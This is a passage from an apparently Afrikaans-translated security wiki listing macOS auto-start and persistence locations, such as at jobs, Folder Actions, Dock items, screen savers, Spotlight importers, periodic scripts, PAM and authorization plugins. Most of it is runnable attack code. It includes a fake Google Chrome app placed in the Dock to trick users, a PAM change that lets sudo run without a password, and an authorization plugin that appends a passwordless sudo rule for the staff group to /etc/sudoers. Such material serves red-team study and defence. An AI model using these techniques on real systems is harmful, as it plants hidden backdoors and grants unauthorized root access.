As jy 'n **ZIP**-lêer as 'n **Aanmeldingsitem** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld gestoor was in **`~/Library`** en die Gids **`LaunchAgents/file.plist`** met 'n agterdeur bevat het, sal daardie gids geskep word (dit is nie standaard nie) en die plist sal bygevoeg word sodat die volgende keer as die gebruiker weer aanmeld, die **agterdeur aangedui in die plist uitgevoer sal word**.

'n Ander opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se TUIS te skep sodat as die gids LaunchAgents reeds bestaan, sal hierdie tegniek steeds werk.

### By

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Nuttig om sandput te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar jy moet **`at`** **uitvoer** en dit moet **geaktiveer** wees
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Plek

* Moet **`at`** **uitvoer** en dit moet **geaktiveer** wees

#### **Beskrywing**

`at` take is ontwerp vir **skedulering van eenmalige take** om uitgevoer te word op sekere tye. Anders as cron take, word `at` take outomaties verwyder na uitvoering. Dit is noodsaaklik om te let dat hierdie take volhoubaar is oor stelselherlaaiers, wat hulle potensiële sekuriteitskwessies onder sekere omstandighede maak.

Standaard is hulle **uitgeschakel** maar die **root**-gebruiker kan **hulle aktiveer** met:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dit sal 'n lêer skep binne 1 uur:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kontroleer die werksopdrag ry met behulp van `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Bokant kan ons twee geskeduleerde take sien. Ons kan die besonderhede van die taak afdruk deur `at -c JOBNUMMER` te gebruik.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
As AT-take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.
{% endhint %}

Die **werk lêers** kan gevind word by `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Die lêernaam bevat die tou, die taaknommer, en die tyd wanneer dit geskeduleer is om uit te voer. Byvoorbeeld, laat ons na `a0001a019bdcd2` kyk.

* `a` - dit is die tou
* `0001a` - taaknommer in heksadesimaal, `0x1a = 26`
* `019bdcd2` - tyd in heksadesimaal. Dit verteenwoordig die minute wat verloop het sedert die epog. `0x019bdcd2` is `26991826` in desimaal. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat `GMT: 2021. April 27., Dinsdag 7:46:00` is.

As ons die taaklêer druk, vind ons dat dit dieselfde inligting bevat as wat ons met `at -c` gekry het.

### Voueraksies

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Nuttig om sandput te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar jy moet in staat wees om `osascript` met argumente te roep om **`System Events`** te kontak om Voueraksies te kan konfigureer
* TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
* Dit het basiese TCC-toestemmings soos Skermblad, Dokumente en Aflaaibare lêers

#### Ligging

* **`/Library/Scripts/Folder Action Scripts`**
* Wortel vereis
* **Trigger**: Toegang tot die gespesifiseerde vouer
* **`~/Library/Scripts/Folder Action Scripts`**
* **Trigger**: Toegang tot die gespesifiseerde vouer

#### Beskrywing & Uitbuiting

Voueraksies is skripte wat outomaties geaktiveer word deur veranderinge in 'n vouer soos die byvoeging, verwydering van items, of ander aksies soos die oopmaak of herskaal van die vouer-venster. Hierdie aksies kan gebruik word vir verskeie take, en kan op verskillende maniere geaktiveer word soos deur die Finder UI of terminalopdragte.

Om Voueraksies op te stel, het jy opsies soos:

1. Die skep van 'n Voueraksie-werkvloei met [Automator](https://support.apple.com/guide/automator/welcome/mac) en dit installeer as 'n diens.
2. 'n Skrip handmatig aan te heg via die Voueraksies Opstelling in die konteksmenu van 'n vouer.
3. Die gebruik van OSAScript om Apple Event-boodskappe na die `System Events.app` te stuur vir die programmatiese opstel van 'n Voueraksie.
* Hierdie metode is veral nuttig om die aksie in die stelsel in te bed, wat 'n vlak van volharding bied.

Die volgende skrip is 'n voorbeeld van wat deur 'n Voueraksie uitgevoer kan word:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Om die bogenoemde skrips bruikbaar te maak deur middel van Vouerhandelinge, kompileer dit met:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Na die skrip is saamgestel, stel Gidsaksies op deur die onderstaande skrip uit te voer. Hierdie skrip sal Gidsaksies wêreldwyd aktiveer en spesifiek die vroeër saamgestelde skrip aan die Skermblad-gids koppel.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Voer die opstellingskrip uit met:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Hier is die manier om hierdie volharding via GUI te implementeer:

Hierdie is die skrip wat uitgevoer sal word:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kompileer dit met: `osacompile -l JavaScript -o folder.scpt source.js`

Skuif dit na:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Dan, open die `Folder Actions Setup`-toepassing, kies die **gids wat jy wil dophou** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Nou, as jy daardie gids met **Finder** oopmaak, sal jou skripsie uitgevoer word.

Hierdie konfigurasie is gestoor in die **plist** wat in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64-formaat geleë is.

Nou, laat ons probeer om hierdie volharding sonder GUI-toegang voor te berei:

1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Verwyder** die Gidsaksies wat jy net ingestel het:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Nou dat ons 'n leë omgewing het

3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Maak die Folder Actions Setup-toepassing oop om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
En dit het nie vir my gewerk nie, maar dit is die instruksies van die skrywe:(
{% endhint %}

### Dock-aanwysers

Skrywe: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Nuttig om sandput te omseil: [✅](https://emojipedia.org/check-mark-button)
* Maar jy moet 'n skadelike aansoek binne die stelsel geïnstalleer hê
* TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* `~/Library/Preferences/com.apple.dock.plist`
* **Trigger**: Wanneer die gebruiker op die aansoek binne die dok klik

#### Beskrywing & Uitbuiting

Al die aansoeke wat in die Dok verskyn, word gespesifiseer binne die plist: **`~/Library/Preferences/com.apple.dock.plist`**

Dit is moontlik om **'n aansoek by te voeg** net met:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Deur van **sosiale ingenieurswese** gebruik te maak, kan jy byvoorbeeld as Google Chrome voorgee binne die dok en werklik jou eie skripsie uitvoer:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Kleurkiesers

Skryf: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* 'n Baie spesifieke aksie moet plaasvind
* Jy sal in 'n ander sandboks eindig
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* `/Library/ColorPickers`
* Root benodig
* Trigger: Gebruik die kleurkieser
* `~/Library/ColorPickers`
* Trigger: Gebruik die kleurkieser

#### Beskrywing & Uitbuiting

**Kompileer 'n kleurkieser** bundel met jou kode (jy kan byvoorbeeld [**hierdie een gebruik**](https://github.com/viktorstrate/color-picker-plus)) en voeg 'n konstrukteur by (soos in die [Skermbeveiliging afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundel na `~/Library/ColorPickers`.

Dan, wanneer die kleurkieser geaktiveer word, moet jou kode ook geaktiveer word.

Let daarop dat die binêre lading van jou biblioteek 'n **baie beperkende sandboks** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Beskrywing**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Beskrywing**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Nuttig om sandboks te omseil: **Nee, omdat jy jou eie program moet uitvoer**
* TCC omseiling: ???

#### Ligging

* 'n Spesifieke program

#### Beskrywing & Uitbuiting

'n Toepassingsvoorbeeld met 'n Finder Sync-uitbreiding [**kan hier gevind word**](https://github.com/D00MFist/InSync).

Toepassings kan `Finder Sync-uitbreidings` hê. Hierdie uitbreiding sal binne 'n toepassing gaan wat uitgevoer sal word. Verder moet die uitbreiding sy kode kan uitvoer **onderteken** wees met 'n geldige Apple-ontwikkelaarsertifikaat, dit moet **gesandboks** wees (hoewel ontspanne uitsonderings bygevoeg kan word) en dit moet geregistreer wees met iets soos:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Skermbeveiliging

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy sal in 'n algemene aansoek-sandboks eindig
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* `/System/Library/Screen Savers`
* Wortel vereis
* **Trigger**: Kies die skermbeveiliging
* `/Library/Screen Savers`
* Wortel vereis
* **Trigger**: Kies die skermbeveiliging
* `~/Library/Screen Savers`
* **Trigger**: Kies die skermbeveiliging

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beskrywing & Uitbuiting

Skep 'n nuwe projek in Xcode en kies die templaat om 'n nuwe **Skermbeveiliging** te genereer. Voeg dan jou kode daaraan toe, byvoorbeeld die volgende kode om logboeke te genereer.

**Bou** dit, en kopieer die `.saver` bondel na **`~/Library/Screen Savers`**. Maak dan die Skermbeveiliging GUI oop en as jy net daarop klik, behoort dit baie logboeke te genereer:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Let wel daarop dat omdat binne die toestemmings van die binêre lading van hierdie kode (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) jy **`com.apple.security.app-sandbox`** kan vind, sal jy **binne die algemene aansoek-sandbox** wees.
{% endhint %}

Saver kode:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Inproppe

skryf op: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Nuttig om sander te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy sal in 'n aansoek-sander eindig
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
* Die sander lyk baie beperk

#### Plek

* `~/Library/Spotlight/`
* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight-inprop bestuur word, word geskep.
* `/Library/Spotlight/`
* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat de spotlight-inprop bestuur, word geskep.
* Wortel nodig
* `/System/Library/Spotlight/`
* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight-inprop bestuur word, word geskep.
* Wortel nodig
* `Some.app/Contents/Library/Spotlight/`
* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat de spotlight-inprop bestuur, word geskep.
* Nuwe aansoek nodig

#### Beskrywing & Uitbuiting

Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
Om hierdie vinnige soekvermoë te fasiliteer, handhaaf Spotlight 'n **eiendomlike databasis** en skep 'n indeks deur **meeste lêers te ontleden**, wat vinnige soektogte deur beide lêernaam en hul inhoud moontlik maak.

Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata-bediener'**. Hierdie proses orkestreer die hele Spotlight-diens. Ter aanvulling hierop is daar verskeie 'mdworker'-demonne wat 'n verskeidenheid instandhoudingstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight-invoerder-inproppe, of **".mdimporter bundels**", wat Spotlight in staat stel om inhoud oor 'n uiteenlopende reeks lêerformate te verstaan en te indekseer.

Die inproppe of **`.mdimporter`** bundels is geleë op die vooraf genoemde plekke en as 'n nuwe bundel verskyn, word dit binne minute gelaai (geen diens herlaaiing nodig nie). Hierdie bundels moet aandui watter **lêertipe en uitbreidings hulle kan bestuur**, op hierdie manier sal Spotlight hulle gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.

Dit is moontlik om **alle die `mdimporters`** wat gelaai is, te vind deur te hardloop:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers te ontled (uitbreidings `.iba` en `.book` onder andere):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
As jy die Plist van ander `mdimporter` nagaan, mag jy nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) is en dit hoef nie uitbreidings te spesifiseer nie.

Verder, neem stelselverstekkers altyd voorrang, so 'n aanvaller kan slegs lêers benader wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.
{% endhint %}

Om jou eie invoerder te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam verander, die **`CFBundleDocumentTypes`** en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun en dit in **`schema.xml`** weerspieël.\
Verander dan die kode van die funksie **`GetMetadataForFile`** om jou lading uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.

Laastens **bou en kopieer jou nuwe `.mdimporter`** na een van die vorige liggings en jy kan nagaan wanneer dit gelaai word deur die **logs te monitor** of deur **`mdimport -L.`** te kontroleer.

### ~~Voorkeurpaneel~~

{% hint style="danger" %}
Dit lyk nie of dit nog werk nie.
{% endhint %}

Verslag: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Dit vereis 'n spesifieke gebruikersaksie
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Beskrywing

Dit lyk nie of dit nog werk nie.

## Root Sandboks Omseiling

{% hint style="success" %}
Hier kan jy beginliggings vind wat nuttig is vir **sandboks omseiling** wat jou in staat stel om eenvoudig iets uit te voer deur dit **in 'n lêer te skryf** terwyl jy **root** is en/of ander **vreemde toestande benodig.**
{% endhint %}

### Periodiek

Verslag: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy moet root wees
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Root benodig
* **Trigger**: Wanneer die tyd aanbreek
* `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
* Root benodig
* **Trigger**: Wanneer die tyd aanbreek

#### Beskrywing & Uitbuiting

Die periodieke skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **aanvangsdemone** wat gekonfigureer is in `/System/Library/LaunchDaemons/com.apple.periodic*`. Let daarop dat skripte wat in `/etc/periodic/` gestoor word, as die **eienaar van die lêer** uitgevoer word, so dit sal nie werk vir 'n potensiële voorregskalering nie.
{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Daar is ander periodieke skripte wat uitgevoer sal word soos aangedui in **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Indien jy enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` kan skryf, sal dit **vroeër of later uitgevoer word**.

{% hint style="warning" %}
Let daarop dat die periodieke skrip **uitgevoer sal word as die eienaar van die skrip**. As 'n gewone gebruiker die skrip besit, sal dit as daardie gebruiker uitgevoer word (dit kan bevoorregting-escalasie aanvalle voorkom).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy moet 'n root wees
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* Root altyd vereis

#### Beskrywing & Uitbuiting

Aangesien PAM meer gefokus is op **volharding** en kwaadwillige sagteware as op maklike uitvoering binne macOS, sal hierdie blog nie 'n gedetailleerde verduideliking gee nie, **lees die writeups om hierdie tegniek beter te verstaan**.

Kontroleer PAM-modules met:
```bash
ls -l /etc/pam.d
```
'n Volharding/privilege-escalation tegniek wat PAM misbruik is so maklik soos om die module /etc/pam.d/sudo te wysig deur die lyn aan die begin by te voeg:
```bash
auth       sufficient     pam_permit.so
```
So dit sal **lyk soos** iets soos dit:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
En dus sal enige poging om **`sudo` te gebruik** werk.

{% hint style="danger" %}
Let wel dat hierdie gids beskerm word deur TCC, so dit is baie waarskynlik dat die gebruiker 'n versoek vir toegang sal kry.
{% endhint %}

### Magtigingsinvoegtoepassings

Verslag: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Verslag: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy moet 'n root wees en ekstra konfigurasies maak
* TCC-omseiling: ???

#### Ligging

* `/Library/Security/SecurityAgentPlugins/`
* Root benodig
* Dit is ook nodig om die magtigingsdatabasis te konfigureer om die invoegtoepassing te gebruik

#### Beskrywing & Uitbuiting

Jy kan 'n magtigingsinvoegtoepassing skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om volharding te behou. Vir meer inligting oor hoe om een van hierdie invoegtoepassings te skep, kyk na die vorige verslae (en wees versigtig, 'n swak geskrewe een kan jou buite sluit en jy sal jou Mac van herstelmodus moet skoonmaak).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Skuif** die bondel na die plek om gelaai te word:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Voeg uiteindelik die **reël** by om hierdie Inprop te laai:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** sal die toestemmingsraamwerk vertel dat dit 'n **eksterne meganisme vir toestemming moet aanroep**. Verder sal **`privileged`** dit laat uitvoer word deur root.

Skakel dit aan met:
```bash
security authorize com.asdf.asdf
```
En dan moet die **personeelgroep sudo-toegang** hê (lees `/etc/sudoers` om te bevestig).

### Man.conf

